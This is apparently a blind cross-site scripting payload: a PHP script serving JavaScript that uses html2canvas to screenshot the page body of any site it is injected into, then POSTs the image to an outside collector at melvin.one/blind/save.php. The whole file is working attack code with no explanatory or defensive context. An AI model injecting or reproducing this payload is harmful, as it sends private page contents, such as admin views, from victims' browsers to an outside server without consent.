<?php
header("Content-Type: text/javascript");
echo file_get_contents('jquery-3.0.0.min.js');
echo "$( document ).ready(function() {";
echo file_get_contents('html2canvas.js');
echo file_get_contents('html2canvas.svg.js');
?>

html2canvas(document.body, {
  onrendered: function(canvas) {
    document.body.appendChild(canvas);
    var dataURL = canvas.toDataURL();
    $.ajax({
      type: "POST",
      url: "https://melvin.one/blind/save.php",
      data: {
         imgBase64: dataURL
      }
    }).done(function(o) {
      console.log('saved');
    });
  }
});
});
